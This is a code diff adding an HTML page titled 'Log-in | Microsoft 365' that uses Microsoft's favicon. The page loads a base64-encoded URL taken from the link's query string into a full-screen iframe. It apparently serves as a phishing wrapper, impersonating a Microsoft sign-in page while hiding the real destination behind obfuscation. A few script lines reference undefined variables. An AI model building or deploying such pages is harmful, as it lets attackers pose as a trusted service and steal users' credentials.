@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="icon" type="image/x-icon"
+        href="https://res.cdn.office.net/officehub/images/content/images/favicon_m365-67350a08e8.ico" />
+    <title>Log-in | Microsoft 365</title>
+
+    <link rel="stylesheet" href="./css/style.css" />
+    <style>
+        body {
+            overflow: hidden;
+        }
+
+        .player-btn {
+            display: block;
+            width: 100%;
+            height: 100px;
+            padding: 1.5rem;
+            font-size: 2rem;
+            text-align: center;
+            color: #3363ff;
+            background-color: #d8e0fd;
+            border: none;
+            border-radius: 0.4rem;
+            transition: 0.2s;
+            cursor: pointer;
+            letter-spacing: 0.1rem;
+            text-decoration: none;
+        }
+
+        .player-btn span {
+            margin-left: 1rem;
+            transition: 0.2s;
+        }
+
+        .player-btn:hover,
+        .player-btn:active {
+            background-color: #c2cffc;
+        }
+
+        .player-btn:hover span,
+        .player-btn:active span {
+            margin-left: 1.5rem;
+        }
+
+        a {
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body style="padding: 0; margin: 0;">
+    <div class="player-container">
+        <iframe id="iframePlayer" class="player" style="width: 100vw; height: 100vh;">
+            Loading...
+        </iframe>
+    </div>
+</body>
+<script>
+    const keyValues = window.location.search;
+    const urlParams = new URLSearchParams(keyValues);
+    const param = urlParams.get('url');
+
+    console.log("[JS] endpoint has been found...");
+    console.log("Loading:", param);
+
+    let iframe = document.getElementById("iframePlayer");
+    let endpoint = window.atob(param);
+
+    console.log(endpoint)
+
+    iframe.src = endpoint
+    title.innerHTML = titleParam
+
+    console.log("URL has been loaded!")
+</script>
+</html>
